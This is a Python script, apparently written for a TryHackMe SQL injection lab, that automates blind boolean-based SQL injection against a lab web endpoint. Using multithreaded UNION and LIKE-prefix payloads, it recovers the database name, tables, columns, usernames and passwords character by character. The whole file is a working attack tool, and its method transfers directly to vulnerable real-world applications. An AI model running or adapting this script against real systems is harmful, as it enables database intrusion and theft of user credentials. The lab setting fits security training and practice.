import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Define the target URL and initial username
url = 'https://10-10-76-95.p.thmlabs.com/run'
initial_username = 'admin123'
headers = {
    'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.155 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://10-10-76-95.p.thmlabs.com/',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://10-10-76-95.p.thmlabs.com/level3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive'
}

# Function to check if the payload returns a true response
def is_true_response(payload):
    data = {
        'level': 3,
        'sql': payload
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json().get('message') == 'true'

# Function to find the number of columns
def find_number_of_columns():
    for i in range(1, 10):  # Adjust the range as needed
        payload = f"select * from users where username = '{initial_username}' UNION SELECT {','.join(str(x) for x in range(1, i+1))};-- LIMIT 1"
        if is_true_response(payload):
            return i
    return None

# Function to find the database name with dynamic output and multi-threading
def find_database_name():
    db_name = ''
    possible_chars = string.ascii_lowercase + string.digits + '-_'
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(is_true_response, f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 WHERE database() LIKE '{db_name + c}%';-- LIMIT 1"): c for c in possible_chars}
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    db_name += c
                    found = True
                    print(f"Database name so far: {db_name}")
                    break
        if not found:
            break
    return db_name

# Function to find table names with dynamic output and multi-threading
def find_table_names(db_name):
    tables = []  # List to store discovered table names
    possible_chars = string.ascii_lowercase + string.digits  # Characters that could be in table names
    table_name = ''  # String to build the current table name
    searched_prefixes = set()  # Set to track prefixes we've already searched to avoid redundant queries

    while True:  # Loop until no more table names are found
        found = False  # Flag to indicate if a new character was found in the table name
        with ThreadPoolExecutor(max_workers=15) as executor:  # Create a thread pool with 15 worker threads
            # Submit tasks to check each possible next character for the table name
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='{db_name}' AND table_name LIKE '{table_name + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (table_name + c)[:1] not in searched_prefixes
            }

            # Process the results of the submitted tasks
            for future in as_completed(futures):
                c = futures[future]  # Get the character associated with this future
                if future.result():  # Check if the query returned a positive result
                    table_name += c  # Append the character to the current table name
                    found = True  # Mark that a character was found
                    print(f"Table name so far: {table_name}")  # Print the current state of the table name
                    break  # Exit the loop since we found a valid character

        if not found:
            if table_name:  # If there's a non-empty table name
                if table_name not in tables:  # If the table name is not already in the list
                    tables.append(table_name)  # Add the table name to the list
                # print(f"Found table: {table_name}")  # Print the discovered table name
                print(tables) # list of table names 
                searched_prefixes.add(table_name[:1])
                print(f"Value of prifix : {searched_prefixes}") # set of prefixes
                table_name = ''
            else:
                break  # Exit the loop if no table name was found and the current name is empty
    
    return tables  # Return the list of discovered table names

# Function to find column names with dynamic output and multi-threading
def find_column_names(db_name, table_name):

    columns = []  # List to store discovered column names
    possible_chars = string.ascii_lowercase + string.digits  # Characters that could be in column names
    column_name = ''  # String to build the current column name
    searched_prefixes = set()  # Set to track prefixes we've already searched to avoid redundant queries
    print(f"Table name: {table_name}, DB name: {db_name}")
    while True:  # Loop until no more column names are found
        found = False  # Flag to indicate if a new character was found in the column name
        with ThreadPoolExecutor(max_workers=15) as executor:  # Create a thread pool with 15 worker threads
            # Submit tasks to check each possible next character for the column name
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{db_name}' AND TABLE_NAME='{table_name}' AND COLUMN_NAME LIKE '{column_name + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (column_name + c)[:3] not in searched_prefixes
            }

            # Process the results of the submitted tasks
            for future in as_completed(futures):
                c = futures[future]  # Get the character associated with this future
                if future.result():  # Check if the query returned a positive result
                    column_name += c  # Append the character to the current column name
                    found = True  # Mark that a character was found
                    print(f"Column name so far: {column_name}")  # Print the current state of the column name
                    break  # Exit the loop since we found a valid character

        if not found:
            if column_name:  # If there's a non-empty column name
                if column_name not in columns:  # If the column name is not already in the list
                    columns.append(column_name)  # Add the column name to the list
                print(f"Found column: {column_name}")  # Print the discovered column name
                searched_prefixes.add(column_name[:1])  # Add the prefix to avoid re-querying
                column_name = ''  # Reset the column name for the next search
            else:
                break  # Exit the loop if no column name was found and the current name is empty

    return columns  # Return the list of discovered column names

# Function to find usernames with dynamic output and multi-threading
def find_usernames(table_name):
    usernames = []
    possible_chars = string.ascii_lowercase + string.digits
    username = ''
    searched_prefixes = set()  # Set to track prefixes we've already searched to avoid redundant queries
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(is_true_response, f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM {table_name} WHERE username LIKE '{username + c}%';-- LIMIT 1"): c for c in possible_chars if (username + c)[:3] not in searched_prefixes}
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    username += c
                    found = True
                    print(f"Username so far: {username}")
                    break
        if not found:
            if username and username not in usernames:
                usernames.append(username)
                print(f"Found username: {username}")
                searched_prefixes.add(username[:1])  # Track the prefix of found usernames
            else:
                break
    return usernames

# Function to find passwords with dynamic output and multi-threading
def find_passwords(table_name, username):
    passwords = []
    possible_chars = string.ascii_lowercase + string.digits
    password = ''
    searched_prefixes = set()
    
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM {table_name} WHERE username='{username}' AND password LIKE '{password + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (password + c)[:1] not in searched_prefixes
            }
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    password += c
                    found = True
                    print(f"Password so far: {password}")
                    break
        if not found:
            if password and password not in passwords:
                passwords.append(password)
                print(f"Found password: {password}")
                searched_prefixes.add(password[:1])  # Add the discovered prefix to the set
                password = ''
            else:
                break
    return passwords


# Main function to execute the SQL Injection steps
def main():
    columns = find_number_of_columns()
    print(f'Number of columns: {columns}')

    db_name = find_database_name()
    print(f'Database name: {db_name}')

    tables = find_table_names(db_name)
    print(f'Tables: {tables}')

    for table in tables:
        columns = find_column_names(db_name, table)
        print(f'Columns in {table}: {columns}')

        usernames = find_usernames(table)
        print(f'Usernames in {table}: {usernames}')

        for user in usernames:
            passwords = find_passwords(table, user)
            print(f'Passwords for {user} in {table}: {passwords}')

if __name__ == '__main__':
    main()
